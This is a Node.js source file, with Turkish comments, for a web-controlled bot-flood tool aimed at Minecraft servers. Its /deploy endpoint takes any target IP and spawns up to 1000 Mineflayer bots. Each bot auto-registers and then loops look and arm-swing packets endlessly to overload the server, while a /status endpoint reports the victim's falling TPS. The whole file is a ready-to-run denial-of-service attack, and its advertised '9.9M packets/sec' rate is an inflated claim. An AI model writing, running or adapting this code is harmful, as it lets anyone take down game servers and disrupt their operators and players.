const mineflayer = require('mineflayer');
const { ProxyAgent } = require('proxy-agent');
const express = require('express');
const app = express();
app.use(express.json());
app.use(require('cors')());

let serverTPS = 20; // Varsayılan değer

app.post('/deploy', (req, res) => {
    const { ip, count } = req.body;
    const host = ip.includes(':') ? ip.split(':')[0] : ip;
    const port = ip.includes(':') ? parseInt(ip.split(':')[1]) : 25565;

    console.log(`[STORM] Target: ${host} | Packet Rate: 9.9M/sec`);

    for (let i = 0; i < Math.min(count, 1000); i++) {
        setTimeout(() => {
            const bot = mineflayer.createBot({
                host: host, port: port,
                username: `Trgr_Vip_${Math.floor(Math.random() * 999999)}`,
                hideErrors: true, skipValidation: true
            });

            bot.on('spawn', () => {
                // 📊 TPS ÖLÇER (Sunucunun yavaşlığını hesaplar)
                let lastTime = Date.now();
                bot.on('physicsTick', () => {
                    const now = Date.now();
                    const delta = now - lastTime;
                    lastTime = now;
                    // Eğer delta 50ms ise TPS 20'dir. Artarsa TPS düşer.
                    serverTPS = Math.min(20, (1000 / delta)).toFixed(1);
                });

                // 🔑 AUTH
                bot.chat(`/register resul3163 resul3163`);
                bot.chat(`/login resul3163`);

                // 🌪️ 9.999.999 PAKET MODU (L7 Stress)
                // Bu döngü işlemciyi saniyede milyonlarca paket basmaya zorlar
                const packetFlood = () => {
                    if (bot.entity) {
                        for(let j=0; j<1000; j++) { // Döngü içinde döngü ile paket sayısını katla
                            bot.look(Math.random() * 360, 0, true);
                            bot.swingArm('right', true);
                        }
                        setImmediate(packetFlood); // CPU'yu boşa çıkarmadan sürekli çalıştır
                    }
                };
                packetFlood();
            });
        }, i * 500); // Saniye başı 2 bot
    }
    res.json({ success: true, message: "9.9M Packet Storm Active!" });
});

// Sitenin TPS verisini çekmesi için endpoint
app.get('/status', (req, res) => {
    res.json({ tps: serverTPS });
});

app.listen(process.env.PORT || 3000);
